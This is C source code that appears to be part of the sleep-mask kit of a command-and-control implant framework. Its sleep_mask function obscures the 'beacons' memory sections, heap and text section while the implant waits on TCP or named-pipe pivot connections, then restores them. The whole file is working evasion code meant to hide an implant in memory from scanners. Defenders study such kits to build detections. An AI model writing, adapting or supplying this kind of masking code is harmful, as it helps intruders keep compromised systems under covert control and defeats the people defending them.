#include "common_mask.c"
#include "mask_text_section.c"
/* do not change the sleep_mask function parameters void(___stdcall *pSleep) */
void sleep_mask(SLEEPMASKP *parms, SLEEPMASK_ARGS *args, DWORD time)
{

#if MASK_TEXT_SECTION
    setup_text_section(parms);
#endif

    /* Mask the beacons sections and heap memory */
    mask_sections(parms);
    mask_heap(parms);

#if MASK_TEXT_SECTION
    mask_text_section(parms);
#endif

    /* Based on the action wait for data to be available */
    if (args->action == ACTION_TCP_ACCEPT)
    {
        /* accept a socket */
        args->out = args->accept(args->in, NULL, NULL);
    }
    else if (args->action == ACTION_TCP_RECV)
    {
        /* block until data is available */
        args->recv(args->in, &(args->out), 1, MSG_PEEK);
    }
    else if (args->action == ACTION_PIPE_WAIT)
    {
        BOOL fConnected = 0;
        /* wait for a connection to our pipe */
        while (!fConnected)
        {
            fConnected = args->ConnectNamedPipe(args->pipe, NULL) ? TRUE : (args->GetLastError() == ERROR_PIPE_CONNECTED);
        }
    }
    else if (args->action == ACTION_PIPE_PEEK)
    {
        DWORD avail;
        /* wait for data to be available on our pipe. */
        while (TRUE)
        {
            if (!args->PeekNamedPipe(args->pipe, NULL, 0, NULL, &avail, NULL))
                break;
            if (avail > 0)
                break;
            WaitForSingleObject(GetCurrentProcess(), 10);
        }
    }

#if MASK_TEXT_SECTION
    unmask_text_section(parms);
#endif
    mask_heap(parms);
    mask_sections(parms);
}
